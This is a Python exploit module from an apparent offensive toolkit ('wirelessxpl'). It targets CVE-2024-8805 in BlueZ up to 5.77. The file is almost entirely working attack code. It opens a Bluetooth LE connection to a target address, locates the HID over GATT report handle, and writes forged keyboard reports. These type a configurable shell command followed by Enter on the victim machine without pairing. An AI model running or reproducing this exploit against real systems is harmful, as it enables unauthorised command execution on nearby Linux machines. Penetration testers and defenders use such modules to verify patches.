# Author: André Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """BlueZ HID over GATT Unauthorized Access RCE (CVE-2024-8805).

    BlueZ versions up to and including 5.77 fail to enforce authorization
    checks on the HID over GATT (HOGP) profile.  An unauthenticated
    attacker within BLE range can connect to the BlueZ GATT server,
    discover the HID Service (UUID 0x1812) and write arbitrary HID
    reports without pairing or authorization.  This allows keystroke
    injection, mouse control and potentially arbitrary code execution
    on the target system.

    Reported via ZDI (ZDI-CAN-25177).

    CVSS v3.1: 8.8 (High), AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "BlueZ HID over GATT Unauthorized Access RCE (CVE-2024-8805)",
        "description": (
            "Exploits CVE-2024-8805 via missing authorization in the BlueZ "
            "HID over GATT (HOGP) profile.  An unauthenticated BLE attacker "
            "can connect to the HID Service (UUID 0x1812) and write HID "
            "reports (keyboard/mouse input) without pairing.  BlueZ <= 5.77 "
            "is affected.  Enables keystroke injection and RCE."
        ),
        "authors": (
            "ZDI (ZDI-CAN-25177, discovery)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2024-8805",
            "https://www.zerodayinitiative.com/advisories/ZDI-CAN-25177/",
            "https://github.com/bluez/bluez/issues/",
        ),
        "disclosure_date": "2024-09-14",
        "platform": "linux",
        "arch": "all",
        "privileged": False,
        "targets": (
            "BlueZ <= 5.77",
            "Ubuntu 22.04/24.04 with BlueZ (unpatched)",
            "Fedora 39/40 with BlueZ (unpatched)",
            "Any Linux with BlueZ HOGP profile enabled",
        ),
    }

    target = OptIP("", "Target BLE device address (BD_ADDR)")
    port = OptPort(4, "BLE ATT CID (default 4 for LE ATT)")
    timeout = OptFloat(5.0, "Connection timeout in seconds")
    command = OptString("id", "Command to inject via keystroke sequence")
    keystroke_delay = OptFloat(0.02, "Delay between injected keystrokes in seconds")

    # BLE/GATT constants
    _BTPROTO_L2CAP = 0
    _BLE_ATT_CID = 0x0004
    _HID_SERVICE_UUID = 0x1812
    _HID_REPORT_CHAR_UUID = 0x2A4D
    _HID_REPORT_MAP_UUID = 0x2A4B
    _HID_CONTROL_POINT_UUID = 0x2A4C

    # ATT opcodes
    _ATT_READ_BY_GROUP_TYPE_REQ = 0x10
    _ATT_READ_BY_GROUP_TYPE_RSP = 0x11
    _ATT_READ_BY_TYPE_REQ = 0x08
    _ATT_READ_BY_TYPE_RSP = 0x09
    _ATT_WRITE_REQ = 0x12
    _ATT_WRITE_RSP = 0x13
    _ATT_ERROR_RSP = 0x01

    # HID keyboard report: modifier(1) + reserved(1) + keycodes(6) = 8 bytes
    _HID_REPORT_SIZE = 8

    # Basic USB HID keycode map (lowercase ASCII -> keycode)
    _KEYMAP = {
        "a": 0x04, "b": 0x05, "c": 0x06, "d": 0x07, "e": 0x08,
        "f": 0x09, "g": 0x0A, "h": 0x0B, "i": 0x0C, "j": 0x0D,
        "k": 0x0E, "l": 0x0F, "m": 0x10, "n": 0x11, "o": 0x12,
        "p": 0x13, "q": 0x14, "r": 0x15, "s": 0x16, "t": 0x17,
        "u": 0x18, "v": 0x19, "w": 0x1A, "x": 0x1B, "y": 0x1C,
        "z": 0x1D, "1": 0x1E, "2": 0x1F, "3": 0x20, "4": 0x21,
        "5": 0x22, "6": 0x23, "7": 0x24, "8": 0x25, "9": 0x26,
        "0": 0x27, "\n": 0x28, " ": 0x2C, "-": 0x2D, "=": 0x2E,
        "/": 0x38, ".": 0x37, ",": 0x36, ";": 0x33, "'": 0x34,
    }

    def _build_hid_report(self, modifier: int, keycode: int) -> bytes:
        """Build an 8-byte HID keyboard input report.

        Format: [modifier, 0x00, keycode, 0, 0, 0, 0, 0]
        """
        return struct.pack("BBBBBBBB", modifier, 0x00, keycode, 0, 0, 0, 0, 0)

    def _build_att_read_by_group_type(self, start: int, end: int, uuid: int) -> bytes:
        """Build ATT Read By Group Type Request to discover services."""
        return struct.pack("<BHHH", self._ATT_READ_BY_GROUP_TYPE_REQ, start, end, uuid)

    def _build_att_read_by_type(self, start: int, end: int, uuid: int) -> bytes:
        """Build ATT Read By Type Request to discover characteristics."""
        return struct.pack("<BHHH", self._ATT_READ_BY_TYPE_REQ, start, end, uuid)

    def _build_att_write(self, handle: int, data: bytes) -> bytes:
        """Build ATT Write Request."""
        return struct.pack("<BH", self._ATT_WRITE_REQ, handle) + data

    def _ble_connect(self) -> socket.socket | None:
        """Open a BLE ATT connection to the target."""
        try:
            sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, self._BTPROTO_L2CAP)
            sock.settimeout(self.timeout)
            target_addr = self.target if isinstance(self.target, str) else str(self.target)
            sock.connect((target_addr, self._BLE_ATT_CID))
            return sock
        except (OSError, TimeoutError):
            return None

    def _scan_gatt_services(self, sock: socket.socket) -> int | None:
        """Discover the HID Service handle range via ATT.

        Returns the start handle of the HID Service or None.
        """
        pkt = self._build_att_read_by_group_type(0x0001, 0xFFFF, 0x2800)
        try:
            sock.send(pkt)
            response = sock.recv(512)
            if len(response) < 2 or response[0] != self._ATT_READ_BY_GROUP_TYPE_RSP:
                return None

            item_len = response[1]
            pos = 2
            while pos + item_len <= len(response):
                if item_len == 6:
                    start_h, end_h, uuid16 = struct.unpack_from("<HHH", response, pos)
                    if uuid16 == self._HID_SERVICE_UUID:
                        return start_h
                pos += item_len
        except (OSError, TimeoutError):
            pass
        return None

    def _find_report_handle(self, sock: socket.socket, start: int) -> int | None:
        """Find the HID Report characteristic value handle."""
        end = start + 20
        pkt = self._build_att_read_by_type(start, end, self._HID_REPORT_CHAR_UUID)
        try:
            sock.send(pkt)
            response = sock.recv(512)
            if len(response) < 4 or response[0] != self._ATT_READ_BY_TYPE_RSP:
                return None

            item_len = response[1]
            if item_len >= 5:
                handle = struct.unpack_from("<H", response, 2)[0]
                value_handle = struct.unpack_from("<H", response, 5)[0]
                return value_handle
        except (OSError, TimeoutError):
            pass
        return None

    def _write_gatt_characteristic(self, sock: socket.socket, handle: int, data: bytes) -> bool:
        """Write data to a GATT characteristic by handle."""
        pkt = self._build_att_write(handle, data)
        try:
            sock.send(pkt)
            response = sock.recv(64)
            return len(response) >= 1 and response[0] == self._ATT_WRITE_RSP
        except (OSError, TimeoutError):
            return False

    def _char_to_hid(self, char: str) -> tuple[int, int]:
        """Convert a character to (modifier, keycode) for HID report."""
        if char.isupper():
            return (0x02, self._KEYMAP.get(char.lower(), 0))
        return (0x00, self._KEYMAP.get(char, 0))

    def run(self) -> None:
        if not self.target:
            print_error("target is required (BLE device address)")
            return

        if not self.check():
            print_error("Target does not appear to have an accessible HID over GATT service")
            return

        print_success("HID over GATT service found; injecting keystroke sequence")
        self._exploit()

    @mute
    def check(self) -> bool:
        """Verify the target exposes the HID over GATT service."""
        sock = self._ble_connect()
        if sock is None:
            return False
        try:
            hid_start = self._scan_gatt_services(sock)
            return hid_start is not None
        finally:
            sock.close()

    def _exploit(self) -> None:
        sock = self._ble_connect()
        if sock is None:
            print_error("Failed to establish BLE connection")
            return

        try:
            hid_start = self._scan_gatt_services(sock)
            if hid_start is None:
                print_error("HID Service not found during exploit phase")
                return

            report_handle = self._find_report_handle(sock, hid_start)
            if report_handle is None:
                report_handle = hid_start + 3
                print_info(f"Report characteristic not enumerated; using estimated handle 0x{report_handle:04X}")

            print_status(f"HID Report handle: 0x{report_handle:04X}")
            print_status(f"Injecting command: {self.command}")

            for char in self.command:
                modifier, keycode = self._char_to_hid(char)
                if keycode == 0:
                    continue

                key_down = self._build_hid_report(modifier, keycode)
                key_up = self._build_hid_report(0, 0)

                self._write_gatt_characteristic(sock, report_handle, key_down)
                time.sleep(self.keystroke_delay)
                self._write_gatt_characteristic(sock, report_handle, key_up)
                time.sleep(self.keystroke_delay)

            enter_down = self._build_hid_report(0, 0x28)
            enter_up = self._build_hid_report(0, 0)
            self._write_gatt_characteristic(sock, report_handle, enter_down)
            time.sleep(self.keystroke_delay)
            self._write_gatt_characteristic(sock, report_handle, enter_up)

            print_success(
                f"Keystroke sequence injected ({len(self.command)} characters + Enter). "
                f"BlueZ HOGP accepted writes without authorization (CVE-2024-8805 confirmed)."
            )
        finally:
            sock.close()
